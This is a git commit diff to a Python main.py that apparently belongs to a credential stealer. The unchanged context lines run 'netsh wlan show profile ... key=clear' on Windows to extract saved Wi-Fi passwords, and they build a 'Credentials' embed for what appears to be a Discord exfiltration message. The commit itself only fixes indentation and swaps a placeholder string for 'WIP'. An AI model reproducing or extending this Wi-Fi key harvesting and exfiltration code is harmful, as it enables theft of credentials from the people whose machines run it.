423ddcd6caaf2b582755b9226fe191c1bf36ace7
burnt.chipset <121685075+burntchipset@users.noreply.github.com>
2023-01-08 17:42:43 +0100

    Update main.py

--- main.py
+++ main.py
@@ -49,7 +49,7 @@ if os == ("nt"):
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
     for i in profiles:
         results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
-       results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
 
 #else:
 #    pass
@@ -109,7 +109,7 @@ data_to_discord["embeds"] = [
                         {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
                             'name': "Credentials",
                             'value':f''' 
-                             pepega
+                             WIP
 
                             ''',
                         }
